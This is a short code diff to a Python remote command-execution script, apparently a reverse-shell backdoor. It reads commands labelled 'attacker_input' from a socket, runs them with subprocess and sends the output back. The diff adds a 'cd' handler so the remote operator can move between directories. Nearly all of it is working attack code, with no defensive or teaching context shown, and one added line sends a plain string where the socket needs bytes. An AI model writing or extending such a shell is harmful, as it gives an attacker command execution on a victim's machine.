@@ -24,8 +24,12 @@ try:
         if attacker_input == 'exit':
             s.close()
             break
-        # if attacker_input[:2] == 'cd':
-            # os.chdir(data[3:].decode())
+        if attacker_input[0] == 'cd':
+            if len(attacker_input) != 2:
+                s.send('Please only use cd by itself with one argument. ex: "cd _____"')
+            else:
+                os.chdir(attacker_input[1])
+                s.send(b' ')
         if len(attacker_input) > 0:
             result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
             s.send(result.stdout)
